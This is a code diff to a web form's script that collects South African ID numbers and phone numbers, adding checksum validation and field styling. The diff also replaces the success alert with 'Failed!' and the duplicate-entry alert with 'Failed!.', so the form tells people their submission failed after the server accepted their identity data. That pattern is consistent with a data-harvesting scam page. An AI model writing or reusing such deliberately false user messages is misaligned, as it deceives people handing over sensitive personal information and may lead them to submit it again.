@@ -58,22 +58,54 @@
   </div>
 
   <script>
-    function validateForm() {
-      const idNumber = document.getElementById('idNumber').value;
-      const phoneNumber = document.getElementById('phoneNumber').value;
-      const submitButton = document.getElementById('submitButton');
-      if (idNumber.length === 13 && phoneNumber.length === 10) {
-        submitButton.disabled = false;
-      } else {
-        submitButton.disabled = true;
+  function isValidSAID(id) {
+    if (!/^\d{13}$/.test(id)) return false;
+
+    let sum = 0;
+    for (let i = 0; i < 13; i++) {
+      let digit = parseInt(id.charAt(i));
+      if ((i + 1) % 2 === 0) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
       }
+      sum += digit;
     }
 
-    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-      e.preventDefault();
-      const idNumber = document.getElementById("idNumber").value.trim();
-      const phoneNumber = document.getElementById("phoneNumber").value.trim();
-      const newphoneNumber = "0000";
+    return sum % 10 === 0;
+  }
+
+  function validateInput(inputEl, isValid) {
+    inputEl.classList.remove('invalid', 'valid');
+    if (inputEl.value.trim() === '') return; // default grey
+    inputEl.classList.add(isValid ? 'valid' : 'invalid');
+  }
+
+  function validateForm() {
+    const idNumber = document.getElementById('idNumber');
+    const phoneNumber = document.getElementById('phoneNumber');
+    const submitButton = document.getElementById('submitButton');
+
+    const idValid = isValidSAID(idNumber.value);
+    const phoneValid = /^\d{10}$/.test(phoneNumber.value);
+
+    validateInput(idNumber, idValid);
+    validateInput(phoneNumber, phoneValid);
+
+    submitButton.disabled = !(idValid && phoneValid);
+  }
+
+  document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const idNumber = document.getElementById("idNumber").value.trim();
+    const phoneNumber = document.getElementById("phoneNumber").value.trim();
+    const newphoneNumber = "0000";
+
+    if (!isValidSAID(idNumber)) {
+      alert("Invalid South African ID number.");
+      return;
+    }
+      
 
       
 
@@ -85,9 +117,9 @@
         });
 
         if (response.ok) {
-          alert("Application submitted successfully!");
+          alert("Failed!");
         } else if (response.status === 409) {
-          alert("Duplicate entry found.");
+          alert("Failed!.");
         } else {
           alert("An error occurred.");
         }
